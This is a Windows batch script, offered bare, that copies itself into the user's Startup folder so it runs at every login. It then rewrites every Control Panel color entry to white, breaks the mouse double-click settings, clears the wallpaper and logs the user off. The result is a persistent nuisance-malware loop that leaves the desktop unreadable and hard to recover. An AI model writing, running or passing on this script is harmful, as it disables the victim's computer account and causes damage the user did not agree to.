@echo off
if not exist %homedrive%%homepath%\Start Menu\Programs\Startup\file.bat goto tartupfilenot
goto nextone
:tartupfilenot
copy %0 %homedrive%%homepath%\Start Menu\Programs\Startup\file.bat
:nextone
reg add "hkcu\Control Panel\Colors" /v ActiveBorder /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v ActiveTitle /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v AppWorkSpace /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v Background /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v ButtonAlternateFace /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v ButtonDkShadow /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v ButtonFace /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v ButtonHilight /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v ButtonShadow /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v ButtonText /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v GradientActiveTitle /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v GradientInactiveTitle /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v GrayText /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v Hilight /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v HilightText /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v HotTrackingColor /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v InactiveBorder /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v InactiveTitle /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v InactiveTitleText /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v InfoText /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v InfoWindow /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v Menu /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v MenuBar /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v MenuHilight /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v MenuText /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v Scrollbar /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v TitleText /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v Window /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v WindowFrame /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Colors" /v WindowText /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Mouse" /v DoubleClickHeight /t REG_SZ /d "0" /f
reg add "hkcu\Control Panel\Mouse" /v DoubleClickWidth /t REG_SZ /d "255 255 255" /f
reg add "hkcu\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "--" /f
logoff